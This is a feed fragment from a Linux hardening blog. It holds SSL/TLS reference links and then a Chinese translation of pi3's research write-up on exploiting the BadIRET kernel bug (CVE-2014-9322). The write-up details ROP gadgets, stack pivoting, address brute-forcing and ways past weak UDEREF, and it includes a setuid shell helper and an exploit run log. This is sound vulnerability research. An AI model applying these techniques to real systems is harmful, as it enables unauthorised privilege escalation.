&lt;p&gt;[4] Deploying Forward Secrecy (Qualys Security Labs; 25 June 2013)
https://community.qualys.com/blogs/securitylabs/2013/06/25/ssl-labs-deploying-forward-secrecy&lt;/p&gt;

&lt;p&gt;[5] Increasing DHE strength on Apache 2.4.x (Ivan Ristić’s blog; 15 August 2013)
http://blog.ivanristic.com/2013/08/increasing-dhe-strength-on-apache.html&lt;/p&gt;

&lt;p&gt;[6] TLS Renegotiation and Denial of Service Attacks (Qualys Security Labs Blog, October 2011)
https://community.qualys.com/blogs/securitylabs/2011/10/31/tls-renegotiation-and-denial-of-service-attacks&lt;/p&gt;

&lt;p&gt;[7] SSL and TLS Authentication Gap Vulnerability Discovered (Qualys Security Labs Blog; November 2009)
https://community.qualys.com/blogs/securitylabs/2009/11/05/ssl-and-tls-authentication-gap-vulnerability-discovered&lt;/p&gt;

&lt;p&gt;[8] CRIME: Information Leakage Attack against SSL/TLS (Qualys Security Labs Blog; September 2012)
https://community.qualys.com/blogs/securitylabs/2012/09/14/crime-information-leakage-attack-against-ssltls&lt;/p&gt;

&lt;p&gt;[9] Defending against the BREACH Attack (Qualys Security Labs; 7 August 2013)
https://community.qualys.com/blogs/securitylabs/2013/08/07/defending-against-the-breach-attack&lt;/p&gt;

&lt;p&gt;[10] Internet-Draft: Prohibiting RC4 Cipher Suites (A. Popov, 1 October 2014)
http://datatracker.ietf.org/doc/draft-ietf-tls-prohibiting-rc4/&lt;/p&gt;

&lt;p&gt;[11] Mitigating the BEAST attack on TLS (Qualys Security Labs Blog; October 2011)
https://community.qualys.com/blogs/securitylabs/2011/10/17/mitigating-the-beast-attack-on-tls&lt;/p&gt;

&lt;p&gt;[12] Is BEAST Still a Threat? (Qualys Security Labs; 10 September 2013)
https://community.qualys.com/blogs/securitylabs/2013/09/10/is-beast-still-a-threat&lt;/p&gt;

&lt;p&gt;[13] This POODLE bites: exploiting the SSL 3.0 fallback (Google Online Security Blog, 14 October 2014)
http://googleonlinesecurity.blogspot.co.uk/2014/10/this-poodle-bites-exploiting-ssl-30.html&lt;/p&gt;

&lt;p&gt;[14] About EV SSL Certificates (CA/B Forum web site)
https://www.cabforum.org/certificates.html&lt;/p&gt;

&lt;p&gt;[T1] HAS THE RSA ALGORITHM BEEN COMPROMISED AS A RESULT OF BERNSTEIN’S PAPER?
http://www.emc.com/emc-plus/rsa-labs/historical/has-the-rsa-algorithm-been-compromised.htm&lt;/p&gt;

&lt;p&gt;[T2] Poodle Bites TLS
https://community.qualys.com/blogs/securitylabs/2014/12/08/poodle-bites-tls&lt;/p&gt;

&lt;p&gt;[T3] Lucky Thirteen: Breaking the TLS and DTLS Record Protocols
http://www.isg.rhul.ac.uk/tls/Lucky13.html&lt;/p&gt;
</description>
        <pubDate>Wed, 29 Jul 2015 01:59:07 +0800</pubDate>
        <link>http://www.hardenedlinux.org/jekyll/update/2015/07/29/ssl-tls-deployment-1.4.html</link>
        <guid isPermaLink="true">http://www.hardenedlinux.org/jekyll/update/2015/07/29/ssl-tls-deployment-1.4.html</guid>
        
        
        <category>jekyll</category>
        
        <category>update</category>
        
      </item>
    
      <item>
        <title>后续故事：数字军火级别的&quot;BadIRET&quot;漏洞利用(CVE-2014-9322)</title>
        <description>&lt;p&gt;作者：pi3, July 4 2015&lt;/p&gt;

&lt;p&gt;原文：&lt;a href=&quot;http://blog.pi3.com.pl/?p=509&quot;&gt;Follow-up on Exploiting “BadIRET” vulnerability (CVE-2014-9322)&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;译者：Shawn the R0ck, July 5 2015&lt;/p&gt;

&lt;p&gt;Shawn：nergal在2015年2月公开的针对&lt;a href=&quot;http://hardenedlinux.org/jekyll/update/2015/07/05/badiret-analysis.html&quot;&gt;BadIRET漏洞的分析文章&lt;/a&gt;仿佛就在昨天，但Linux内核社区对安全的态度的确比10年还糟糕，Linux内核社区一如既往坚持”Security through obscurity”这种简单到根本不用考虑斯拉夫兵工厂的威胁建模，不辛的是，BadIRET又是一例Linux内核社区认为几乎不可利用但实际是可利用的漏洞，更糟糕的是一些商业GNU/Linux厂商因为各种原因（在后棱镜时代，不得不考虑非商业因素的可能）基本按照&lt;a href=&quot;https://securityblog.redhat.com/2015/04/08/dont-judge-the-risk-by-the-logo/&quot;&gt;是否有公开的漏洞利用会成为他们对于风险评估的重要指标&lt;/a&gt;，这种说法好像是当0-day exploit从来都不存在一样，这的确是一个黑暗的时代，就算没有Mr.Snowden，这的确也称的上是一个黑暗的信息时代，anyway，这次pi3公开了BadIRET的漏洞利用代码，这对于安全研究人员来说是一个好事，也希望整个事件能帮助个人以及企业GNU/Linux用户对于安全有正确的认识。&lt;/p&gt;

&lt;p&gt;一个漏洞的产生到漏洞利用至少会经历好几个阶段：Bug –&amp;gt; exploitable bug(vulnerability) –&amp;gt; poc –&amp;gt; exploit –&amp;gt; reliable/weaponized exploit。虽然skiddie都喜欢把fuzzing出来的bug讲成blah-blah-blah的故事或者作为PR，但让数字军火商或者斯拉夫兵工厂关心的漏洞属于能到最后两个阶段的vulnerability。&lt;/p&gt;

&lt;hr /&gt;
&lt;p&gt;by pi3&lt;/p&gt;

&lt;p&gt;Hi,&lt;/p&gt;

&lt;p&gt;分析&lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9322&quot;&gt;CVE-2014-9322&lt;/a&gt;的旅程并非一帆风顺，但它值得我们花一些时间去分析所有的信息。我会尽力…&lt;/p&gt;

&lt;h2 id=&quot;introduction--non-technical-almost&quot;&gt;1) Introduction – non-technical (almost)&lt;/h2&gt;

&lt;p&gt;一切都开始于&lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9090&quot;&gt;CVE-2014-9090&lt;/a&gt;。这个漏洞是由Andy Lutomirski发现的，引用MITRE的描述：&lt;/p&gt;
&lt;pre&gt;
Linux内核3.17.4在arch/x86/kernel/traps.c里的do_double_fault函数没有正确
的处理SS(Stack Segment)寄存器相关的错误处理，导致本地用户可以发启DoS攻
击让内核panic(...)
&lt;/pre&gt;

&lt;p&gt;这个顶多导致本地DoS攻击的洞对于防御者而言听起来并不是那么重要（但也引起了一定的注意，因为毕竟是一个漏洞），对于攻击者的角度也是一样，因为即使利用成功也无法获得巨大利益( Shawn:相对于获得root而言)。&lt;/p&gt;

&lt;p&gt;“有趣”的是在Borislav Petkov问了一些问题后，Andy Lutomirski在相同的功能里发现了另一个被第一个漏洞掩盖的漏洞。不幸(幸运)的是，这是一个很严重的漏洞。Linux内核在x86架构下没有恰当的处理于SS寄存器有关的错误处理。引用自MITRE：&lt;/p&gt;
&lt;pre&gt;
&quot;(...)通过触发一个IRET指令从一个错误的空间去去访问一个GS基地址从而让本地用户获取最高权限&quot;
&lt;/pre&gt;

&lt;p&gt;这个漏洞的特性听起来很熟悉吗？&lt;/p&gt;

&lt;p&gt;那Rafal ‘n3rgal’ Wojtczuk的研究最终停止于&lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0217&quot;&gt;CVE-2012-0217&lt;/a&gt;呢？(这个直接指向了&lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-0744&quot;&gt;CVE-2006-0744&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;是的…原则上两个漏洞都给我们了相同的东西 — 我们能强制内核去执行在用户空间控制的GS基地址（通过%gs寄存器）。&lt;/p&gt;

&lt;p&gt;因为一些原因CVE-2014-9322并没有引起太多注意（跟CVE-2006-0744类似），直到Rafal ‘n3rgal’ Wojtczuk在2015年2月5日在Bromium Labs的blog上&lt;a href=&quot;http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/&quot;&gt;公布了另外震撼的研究&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;这篇分析谈到了关于这个漏洞的本质，即可以被利用为代码执行（这可不是简单的事情，点赞n3rgal的研究）和使用单个字节为NULL的写操作让整个漏洞利用成为军火级别的稳定利用，能绕过SMEP（不是SMAP）。非常推荐读读这篇分析。&lt;/p&gt;

&lt;p&gt;在这篇漏洞分析公开后引起了更多的关注（特别是grsecurity的twitter帐号:-)）。知道现在（差不多半年了）也没有公开的真正的漏洞利用去实现Rafal关于代码执行的想法。只有一个演示DoS攻击的PoC（结果和CVE-2014-9090相同 — 没多大用处）：&lt;/p&gt;

&lt;p&gt;https://rdot.org/forum/showthread.php?t=3341&lt;/p&gt;

&lt;p&gt;另外一个实现：&lt;/p&gt;

&lt;p&gt;https://www.exploit-db.com/exploits/36266/&lt;/p&gt;

&lt;h2 id=&quot;more-technical-part-based-on-fedora-20---kernel-31110-301fc20x8664&quot;&gt;2) More technical part (based on Fedora 20 -&amp;gt; kernel: 3.11.10-301.fc20.x86_64)&lt;/h2&gt;

&lt;p&gt;我决定接受这个挑战去完整的实现Rafal的想法并且在成功的过程中解决了很多有趣的问题。我将以Rafal的分析文章结束作为开始，最终成功的实现stack pivoting和执行ROP gadgets（在他的描述里是去关掉CR4寄存器中关掉SMEP和在用户空间的页去执行’真’的shellcode/kernelcode）。&lt;/p&gt;

&lt;p&gt;*) Stack pivoting和ROP执行于follow_link()函数的上下文，这个函数是inline所以整个实现都在path_openat()的代码段里。这里是概述的上下文流程：&lt;/p&gt;
&lt;pre&gt;
SyS_open -&amp;gt; SYSC_open -&amp;gt; do_sys_open -&amp;gt; do_filp_open -&amp;gt; path_openat -&amp;gt; follow_link()
&lt;/pre&gt;

&lt;p&gt;Inline函数调用相对地址，这可以最终重定向到我们的代码：&lt;/p&gt;
&lt;pre&gt;
...
   0xffffffff811b84ab &amp;lt;+955&amp;gt;:   jmpq   0xffffffff811b81b3 
   0xffffffff811b84b0 &amp;lt;+960&amp;gt;:   movl   $0x4,0x40(%r12)
   0xffffffff811b84b9 &amp;lt;+969&amp;gt;:   mov    0x30(%r15),%rax
   0xffffffff811b84bd &amp;lt;+973&amp;gt;:   mov    %r15,%rdi
   0xffffffff811b84c0 &amp;lt;+976&amp;gt;:   mov    %r12,%rsi
   0xffffffff811b84c3 &amp;lt;+979&amp;gt;:   mov    0x20(%rax),%rax
   0xffffffff811b84c7 &amp;lt;+983&amp;gt;:   callq  *0x8(%rax)
                                ^^^^^^^^^^^^^^^^^
   0xffffffff811b84ca &amp;lt;+986&amp;gt;:   cmp    $0xfffffffffffff000,%rax
   0xffffffff811b84d0 &amp;lt;+992&amp;gt;:   mov    %rax,%r15
   0xffffffff811b84d3 &amp;lt;+995&amp;gt;:   jbe    0xffffffff811b8532 
   0xffffffff811b84d5 &amp;lt;+997&amp;gt;:   mov    %r12,%rdi
   0xffffffff811b84d8 &amp;lt;+1000&amp;gt;:  mov    %eax,%ebx
   0xffffffff811b84da &amp;lt;+1002&amp;gt;:  callq  0xffffffff811b2930 
...
&lt;/pre&gt;

&lt;p&gt;在我们的代码执行后第一个问题来了，所有调用函数path_put(), do_last(), dput(), mntput()或者put_link()可能都会遇到内核锁。因为栈已经被pivoted可不会带来一个好的结局。另外，path_openat()里有很多inline函数，一些寄存器有特殊意义（指针指向特定的结构或者对象），所以内核去访问某个点可能会直接造成内核崩溃。&lt;/p&gt;

&lt;p&gt;一开始我尝试跟踪了所有有问题的执行过程和手工修复了一些，但这条路径下的寄存器/对象/spinlocks之间有太多的关联…（btw，不幸（幸运）的是，跟之前的版本相比，Linux内核3.xx改变了raw_spin_lock的内部描述，当你打算手工同步时这会成为一个问题）。&lt;/p&gt;

&lt;p&gt;这里需要一个更好的解决方案，如果你思考下关于pivoting自己你可能会找到一个方案。如果你打算手工修复所有在这个过程中遇到的问题你也能成功。如果你找到一条路径去把原始的栈帧”恢复“到stack pivoting之前的状态，这会帮你搞定所有的锁问题，正确的对栈进行unwind以及系统会稳定的运行。这是能实现的，让我们称她为reverse stack pivoting;-)。在stack pivot后，在临时寄存器里你应该会拥有一个你想知道的栈的合法地址。在我们的场景里稍微有些复杂，因为我们失去了地址的32位的最高有效位。ROP gadgets像：&lt;/p&gt;
&lt;pre&gt;
   0xffffffff8119f1ed &amp;lt;__mem_cgroup_try_charge+1949&amp;gt;:   xchg   %eax,%esp
   0xffffffff8119f1ee &amp;lt;__mem_cgroup_try_charge+1950&amp;gt;:   retq
&lt;/pre&gt;

&lt;p&gt;为什么这些gadget会产生而32 bits会丢失呢？请阅读Rafal的文章。&lt;/p&gt;

&lt;p&gt;所以，如果我们在直接pivoting后找到了一些能保存原始栈上32位最低有效位ROP gadget，我们可以尝试在把控制权交给内核前恢复和重构原始地址。我选择了如下ROP-gadget：&lt;/p&gt;
&lt;pre&gt;
   0xffffffff8152d8fe :       push   %rax
   0xffffffff8152d8ff :       pop    %rax
   0xffffffff8152d900 :       pop    %rbp
   0xffffffff8152d901 :       retq
&lt;/pre&gt;

&lt;p&gt;去执行push %rax（这个值事实上高位被清零了）和保存值后移动栈指针。在这个点上我们可以精确的计算它会存在哪里。&lt;/p&gt;

&lt;p&gt;问题解决了（reverse-stack pivot胜利 :P）&lt;/p&gt;

&lt;p&gt;*) 如果你的shellcode执行时间过长，有很大的概率进程调度器会让更紧急的任务先执行， – 取决于当前的执行和什么样的任务会抢占。你可能经常收到APIC时间中断去更新进程时间，在有些情况下可能会带给你的漏洞利用一些麻烦，你必须考虑这些事情！&lt;/p&gt;

&lt;p&gt;btw.如果你运气不好，在做stack pivoting时刚好被抢占;p（Shawn:这种概率都遇上了你也就认了吧，可能真是上帝让你别去日你的当前目标；-））&lt;/p&gt;

&lt;p&gt;*) 我们的代码执行时但proc_root结构被损坏…;-) 这不是我们愿意看到的。如果有其他进程对/proc文件系统有任何操作，它会戏剧性的增加内核崩溃的概率。proc_root.subdir值必须尽快被恢复以避免系统被随机的crash掉。有几种可能的方法：&lt;/p&gt;

&lt;p&gt;a) 反而覆盖subdir的6 bytes只覆盖其中5个，这样其中3 bytes未碰。这意味着我们可以通过0xffff8800和最高有效位相加来轻松重构原始值，每一个单独byte最多256次尝试。内核crash的概率很低（触及到未映射的页）。另外，这个需要用户空间分配16MB去保证引用被覆盖的proc_root.subdir总是在我们控制的内存里。&lt;/p&gt;

&lt;p&gt;b) 我们可以通过’阻止’#PF来爆破整个地址。在一段很短的时间里，我们可以用一段简单程序覆盖#PF处理程序：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;从栈上获得异常&lt;/li&gt;
  &lt;li&gt;改变已知映射会造成crash的地址&lt;/li&gt;
  &lt;li&gt;重启错误处理指令&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;原生的爆破循环会继续运行&lt;/p&gt;

&lt;p&gt;c) 忽略所有的问题，仅仅去重构能通过爆破获得的剩下的bytes。很明显这很稳定和高效，我们知道HSB是0xfff8800和两个LSB bytes。我们需要找到2个未知的bytes。在Linux上（与Windows相反），内核内存不被paged out（swapped out）。去爆破中间的2个bytes来重构地址时访问到未映射的内存页概率是很低的 – believe me or not, it works well :)&lt;/p&gt;

&lt;p&gt;问题同样是如何判断地址是正确的。这很简单，struct proc_dir_entry有’parent’。我们必须找到proc_root(已知地址）的特定offset。最终，我们检查了65536个地址，#FP的概率也是很低的。我从来没遇到过那种情况。&lt;/p&gt;

&lt;p&gt;总结我们的shellcode必须：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;保存原生的栈指针值&lt;/li&gt;
  &lt;li&gt;关闭中断（防止被抢占）和开始重构被污染的proc_root.subdir值&lt;/li&gt;
  &lt;li&gt;实现真正的(s)hellcode&lt;/li&gt;
  &lt;li&gt;恢复原生栈指针&lt;/li&gt;
  &lt;li&gt;恢复栈帧指针&lt;/li&gt;
  &lt;li&gt;恢复寄存器指向的内部对象&lt;/li&gt;
  &lt;li&gt;启动中断和返回正常内核执行&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;grsecurity--uderef&quot;&gt;3) Grsecurity =&amp;gt; UDEREF&lt;/h2&gt;

&lt;p&gt;之前我提到过Rafal的研究曾经被spender给“看到”过：&lt;/p&gt;

&lt;p&gt;http://twitter.com/grsecurity/status/562363332079144960
http://twitter.com/grsecurity/status/562363788125831172&lt;/p&gt;

&lt;p&gt;另外，一些人建议UDEREF和SMAP一样能高效的防御这个漏洞：&lt;/p&gt;

&lt;p&gt;http://seclists.org/oss-sec/2014/q4/1052&lt;/p&gt;

&lt;pre&gt;
&quot;这可能是一个容易的提权的漏洞利用，但除了针对带有SMAP和UDEREF的系统。在
SMAP/UDEREF上，假定mitigation都是奏效的，这个bug的影响可能会局限于大规
模的memory corruption和crash或者重启。&quot;
&lt;/pre&gt;

&lt;p&gt;这并不是完全正确。UDEREF可能跟（事实上，甚至远超）SMAP一样高效，或者仅像SMEP（在AMD64上）一样有效的防御漏洞利用。但问题出在哪里呢？目前针对AMD64平台，UDEREF有3种不同的实现：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;慢/弱的遗留实现&lt;/li&gt;
  &lt;li&gt;针对Sandy Bridge(Shawn：2011年）和后续CPU的强实现&lt;/li&gt;
  &lt;li&gt;针对Sandy Bridge和后续CPU的快/弱实现&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;第一个针对AMD64平台的UDEREF实现是“弱”实现，相关信息PaX team也有描述：&lt;/p&gt;

&lt;p&gt;http://grsecurity.net/pipermail/grsecurity/2010-April/001024.html&lt;/p&gt;

&lt;pre&gt;
&quot;(...)所以amd64的UDEREF做了些什么呢？在用户空间-&amp;gt;内核空间的转换中基本上
unmaps了原始用户地址范围和重新映射到了不同的地址上并且标记为不可执行
/supervisor权限（所以至少直接的代码执行作为漏洞利用是无法奏效的）
&lt;/pre&gt;

&lt;p&gt;然后接着：&lt;/p&gt;

&lt;pre&gt;
&quot;(..) UDEREF/amd64不保证（合法）用户空间访问函数当用户空间被允许（一些
像特定系统作为用户空间临时访问内核内存，这在UDEREF/i386上被强制一致，而
在AMD64上则没有）不可以直接访问内核内存。所以如果有BUG能骗内核进入用户
空间访问的指针又恰好指向内核空间的话就能利用成功，这一点不像i386的实现。

另外一件糟糕的事情是用户空间的阴影区域，这造成了2个后果：1，用户空间地
址大小小于UDEREF（42 vs 47 bits，这种减小最终影响ASLR）， 2，这个阴影区
域总是映射着，所以内核代码异常访问这个区间并不会造成oops而且也是可被利
用的（如果一个漏洞利用能让内核deref这一区域里的任意地址）(...)&quot;
&lt;/pre&gt;

&lt;p&gt;== weak UDEREF ==
这意味着实际上UDEREF类似SMEP。所以如何能成功的漏洞利用有这个版本的UDEREF的系统呢？你只需要修改ROP。不像在CR4寄存器中关掉SMEP位，而是从用户空间实现完整的ROP的shellcode。这是可能的，“弱”UDEREF实现无法防御这种利用。&lt;/p&gt;

&lt;p&gt;== “new” UDEREF ==&lt;/p&gt;

&lt;p&gt;为什么“强”UDEREF实现是不同的而为什么她需要Sandy Bridge架构的支持？&lt;/p&gt;

&lt;p&gt;对，这是有趣的部分。我从没见关于”新“版UDEREF来自于官方的任何信息。我都没注意到这些实现有些变动是在我玩漏洞利用时产生的;-)&lt;/p&gt;

&lt;p&gt;强UDEREF实现使用的Sandy Bridge++特性被称为PCID，PCID在TLB中打”tags”（Shawn:有些人会翻译为标签）。UDEREF可以完全的分离用户空间和内核空间（通过创建新的PGD表）：&lt;/p&gt;
&lt;pre&gt;
static inline void enter_lazy_tlb(struct mm_struct *mm, struct task_struct *tsk)
{
++#if defined(CONFIG_X86_64) &amp;amp;&amp;amp; defined(CONFIG_PAX_MEMORY_UDEREF)
+     if (!(static_cpu_has(X86_FEATURE_PCID))) {
+             unsigned int i;+                pgd_t *pgd;
++            pax_open_kernel();
+             pgd = get_cpu_pgd(smp_processor_id(), kernel);
+             for (i = USER_PGD_PTRS; i &amp;lt; 2 * USER_PGD_PTRS; ++i)
+                     set_pgd_batched(pgd+i, native_make_pgd(0));
+             pax_close_kernel();
+     }
+#endif

+#if defined(CONFIG_X86_64) &amp;amp;&amp;amp; defined(CONFIG_PAX_MEMORY_UDEREF)
+             if (static_cpu_has(X86_FEATURE_PCID)) {
+                     if (static_cpu_has(X86_FEATURE_INVPCID)) {
+                             u64 descriptor[2];
+                             descriptor[0] = PCID_USER;
+                             asm volatile(__ASM_INVPCID : : &quot;d&quot;(&amp;amp;descriptor), &quot;a&quot;(INVPCID_SINGLE_CONTEXT) :
&quot;memory&quot;);
+                             if (!static_cpu_has(X86_FEATURE_STRONGUDEREF)) {
+                                     descriptor[0] = PCID_KERNEL;
+                                     asm volatile(__ASM_INVPCID : : &quot;d&quot;(&amp;amp;descriptor),
&quot;a&quot;(INVPCID_SINGLE_CONTEXT) : &quot;memory&quot;);
+                             }
+                     } else {
+                             write_cr3(__pa(get_cpu_pgd(cpu, user)) | PCID_USER);
+                             if (static_cpu_has(X86_FEATURE_STRONGUDEREF))
+                                     write_cr3(__pa(get_cpu_pgd(cpu, kernel)) | PCID_KERNEL | PCID_NOFLUSH);
+                             else
+                                     write_cr3(__pa(get_cpu_pgd(cpu, kernel)) | PCID_KERNEL);
+}
+             } else
+#endif
&lt;/pre&gt;

&lt;p&gt;最终，运行于内核模式的上下文将看不到任何用户空间的页。这个实现我个人相信比SMAP要强的多。为什么呢？&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;你不能只关闭CR4寄存器里的一个bit而关掉整个mitigation&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;在SMAP的情况下，你可以看到用户空间的页（有存在的页表翻译用户空间地址，’P’位已经设置）但你仅仅是不能触碰到。在”新”UDEREF的情况下，你根本看不到用户空间（内核上下文的PGD是完全不同的，没有页表描述用户空间地址。’P’没有被设置）。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;这个UDEREF版本最早是在grsecurity 3.0于2014年2月引入的。干得漂亮！如果PaX/Grsecurity能公布一些他们的研究细节就更棒了;-)&lt;/p&gt;

&lt;p&gt;Btw. 这2个case都是接触到用户空间地址是一样的 - #PF会被生成;-)&lt;/p&gt;

&lt;p&gt;Btw2. 同样的“强”UDEREF可以不需要硬件PCID特性也能实现。但最大的区别就是性能。如果没有硬件PCID支持的情况下从性能的角度看，这个特性会很糟糕。&lt;/p&gt;

&lt;h2 id=&quot;summarizing-&quot;&gt;== Summarizing ==&lt;/h2&gt;

&lt;p&gt;这个漏洞可以在UDEREF下被利用，但不能在使用了Sandy Bridge++特性的“新”UDEREF下被利用。&lt;/p&gt;

&lt;p&gt;事实上，你仍然可以用这个漏洞针对“新”UDEREF用作DoS攻击？如何实现呢？这个很有趣，你可以强制#PF的无限循环;-) 当内核进入do_general_protection()函数后会尝试通过以下指令让GS基读取GDT：&lt;/p&gt;

&lt;pre&gt;
    0xffffffff8172910e :       mov    %gs:0xa880,%rbx
&lt;/pre&gt;

&lt;p&gt;这个情况下GS基是指向用户空间的内存。因为这里没有PTE条目（内核看不到用户空间的页），#PF将会被产生。page_fault()函数会被执行：&lt;/p&gt;

&lt;pre&gt;
page_fault -&amp;gt; do_page_fault -&amp;gt; __do_page_fault -&amp;gt; restore_args
&lt;/pre&gt;

&lt;p&gt;这会导致再次读GDT然后下一个#PF产生，就这样一直循环下去;-) 是的，你可以让内核崩溃掉但没办法做进一步的漏洞利用。漏洞利用在这里被阻止了。&lt;/p&gt;

&lt;h2 id=&quot;funny-facts-&quot;&gt;4) Funny facts;-)&lt;/h2&gt;

&lt;p&gt;a) 当你调用pthread_create()函数时，一些版本的libthread需要创建RWX权限的内存。这在PaX/Grsec的mmap()加固是不被允许的，当pthread_create()调用mmap()时进程会被杀掉;-) 我在Ubuntu LTS上运行grsecurity加固内核时遇到过这个情况。&lt;/p&gt;

&lt;p&gt;b) 在内核3.11.10-301.fc20.x86_64的__switch_to()函数实现中使用了OSXSAVE扩展（CR4寄存器的bit 18），但内核并不检查这个CPU是否有这个扩展：&lt;/p&gt;
&lt;pre&gt;
     0xffffffff81011714 &amp;lt;__switch_to+644&amp;gt;    xsaveopt64 (%rdi)
&lt;/pre&gt;

&lt;p&gt;__switch_to()是在禁用中断时运行，如果OSXSAVE扩展没有打开的话，CPU会生成一个#UD造成死锁。在进入__switch_to()指令之前，不管是否关闭中断都会锁住runqueue运行队列，在#UD的情况下不会被解锁。&lt;/p&gt;

&lt;p&gt;我好奇如果有人真的遇到过这个问题;-)&lt;/p&gt;

&lt;p&gt;c) Fedora 20作为测试环境，这个漏洞利用非常稳定（&lt;a href=&quot;http://site.pi3.com.pl/exp/p_cve-2014-9322.tar.gz&quot;&gt;源代码在我的网站上已经公布&lt;/a&gt;）：&lt;/p&gt;
&lt;pre&gt;
[pi3@localhost clean_9322]$ cat z_shell.c
#include 

int main(void) {

   char *p_arg[] = { &quot;/bin/sh&quot;, NULL };

   setuid(0);
   seteuid(0);
   setgid(0);
   setegid(0);
   execv(&quot;/bin/sh&quot;,p_arg,NULL);

}
[pi3@localhost clean_9322]$ gcc z_shell.c -o z_shell
[pi3@localhost clean_9322]$ cp z_shell /tmp/pi3
[pi3@localhost clean_9322]$ ls -al /tmp/pi3
-rwxrwxr-x 1 pi3 pi3 8764 May  6 23:09 /tmp/pi3
[pi3@localhost clean_9322]$ id
uid=1000(pi3) gid=1000(pi3) groups=1000(pi3)
[pi3@localhost clean_9322]$ /tmp/pi3
sh-4.2$ id
uid=1000(pi3) gid=1000(pi3) groups=1000(pi3)
sh-4.2$ exit
exit
[pi3@localhost clean_9322]$ gcc -o procrop procrop.c setss.S
[pi3@localhost clean_9322]$ gcc -o p_write8 swapgs.c setss.S -lpthread
swapgs.c: In function ‘main’:
swapgs.c:175:29: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
               : &quot;r&quot;(4), &quot;r&quot;((int)p_to_d), &quot;r&quot;(1)
                             ^
[pi3@localhost clean_9322]$ ./procrop

        ...::: -=[ Exploit for CVE-2014-9322 ]=- :::...
                           by Rafal 'n3rgal' Wojtczuk
                           &amp;amp;&amp;amp; Adam 'pi3' Zabrocki

                Usage: ./procrop 

                        Number:

                                1 - kernel [3.11.10-301.fc20.x86_64]

[pi3@localhost clean_9322]$ ./procrop 1 &amp;amp;
[1] 5827
[pi3@localhost clean_9322]$
        ...::: -=[ Exploit for CVE-2014-9322 ]=- :::...
                           by Rafal 'n3rgal' Wojtczuk
                           &amp;amp;&amp;amp; Adam 'pi3' Zabrocki

        [+] Using kernel target: 3.11.10-301.fc20.x86_64

[pi3@localhost clean_9322]$
[pi3@localhost clean_9322]$
[pi3@localhost clean_9322]$ ps aux |grep procr
pi3       5827 83.0  0.0   4304   320 pts/1    RL   23:12   0:05 ./procrop 1
pi3       5829  0.0  0.1 112660   916 pts/1    S+   23:12   0:00 grep --color=auto procr
[pi3@localhost clean_9322]$ ./p_write8

        ...::: -=[ Exploit for CVE-2014-9322 ]=- :::...
                           by Rafal 'n3rgal' Wojtczuk
                           &amp;amp;&amp;amp; Adam 'pi3' Zabrocki

                Usage: ./p_write8 

                        Number:

                                1 - kernel [3.11.10-301.fc20.x86_64]

[pi3@localhost clean_9322]$
[pi3@localhost clean_9322]$ ./p_write8 1

        ...::: -=[ Exploit for CVE-2014-9322 ]=- :::...
                           by Rafal 'n3rgal' Wojtczuk
                           &amp;amp;&amp;amp; Adam 'pi3' Zabrocki

        [+] Using kernel target: 3.11.10-301.fc20.x86_64
        [+] mmap() memory in first 2GB of address space... DONE!
        [+] Preparing kernel structures... DONE! (ovbuf at 0x602140)
        [+] Creating LDT for this process... DONE!
        [+] Press enter to start fun-game...
[exploit] pthread runningAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA